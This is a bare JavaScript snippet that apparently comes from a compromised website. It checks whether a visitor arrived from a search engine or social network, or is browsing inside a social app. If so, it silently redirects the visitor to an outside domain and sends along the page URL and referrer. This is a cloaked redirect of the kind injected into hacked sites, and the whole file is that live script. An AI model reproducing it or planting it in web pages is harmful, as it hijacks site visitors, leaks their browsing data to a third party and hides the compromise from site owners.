var ars = 'https://www.caretxdigital.com';

if(['.google.', 'bing.', '.yahoo.', 'yandex.', 'facebook.', 'pinterest.', 'duckduckgo.', 'aol.', 'dogpile.'].some(s => document.referrer.toLowerCase().includes(s)) || ['fb', 'facebook', 'pinterest', 'twitter'].some(s => navigator.userAgent.toLowerCase().includes(s))){ window.location.href = ars + '/?arsae='+ encodeURIComponent(window.location.href) + '&arsae_ref='+ encodeURIComponent(document.referrer) }
